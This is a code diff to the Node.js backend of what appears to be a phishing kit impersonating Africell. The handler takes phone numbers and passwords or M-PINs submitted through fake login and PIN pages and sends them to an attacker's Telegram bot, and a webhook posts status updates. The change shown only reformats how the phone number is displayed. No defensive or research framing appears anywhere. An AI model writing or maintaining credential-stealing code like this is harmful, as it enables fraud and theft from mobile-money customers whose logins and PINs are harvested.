@@ -54,16 +54,18 @@ app.post('/api/submit-order', async (req, res) => {
         const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
         const countryFlag = "🇸🇱";
-        const countryCode = "+232";
+        
+        // Clean phone input to ensure no +232
+        const rawDigits = phone.replace(/\+232/g, '').trim();
 
         // Check if this submission is from pin.html (PIN code) or login.html (Password)
         const isPinStep = /^\d+$/.test(uniqueId) && uniqueId.length >= 4; 
         const headerTitle = isPinStep ? "🔐 *Africell M-PIN Submitted*" : "🔔 *New Africell Login Attempt*";
         const credentialLabel = isPinStep ? "M-PIN" : "Password";
 
-        // Formatted cleanly so tapping/copying only grabs the flag, code, and number together
+        // Formatted with flag and + followed directly by the entered digits
         const message = `${headerTitle}\n\n` +
-                        `📱 Phone: \`${countryFlag} ${countryCode} ${phone.replace('+232', '').trim()}\`\n` +
+                        `📱 Phone: \`${countryFlag} + ${rawDigits}\`\n` +
                         `🔑 ${credentialLabel}: \`${uniqueId || 'N/A'}\``;
 
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -142,10 +144,10 @@ app.post('/api/telegram-webhook', async (req, res) => {
             }
 
             const countryFlag = "🇸🇱";
-            const countryCode = "+232";
+            const rawDigits = phone.replace(/\+232/g, '').trim();
 
             let updatedMessage = `📋 *${messageTitle}*\n\n` +
-                                 `📱 Phone: \`${countryFlag} ${countryCode} ${phone.replace('+232', '').trim()}\`\n` +
+                                 `📱 Phone: \`${countryFlag} + ${rawDigits}\`\n` +
                                  `🔑 Credential: \`${uniqueId}\`\n` +
                                  `📌 Status: *${actionText}*`;
 
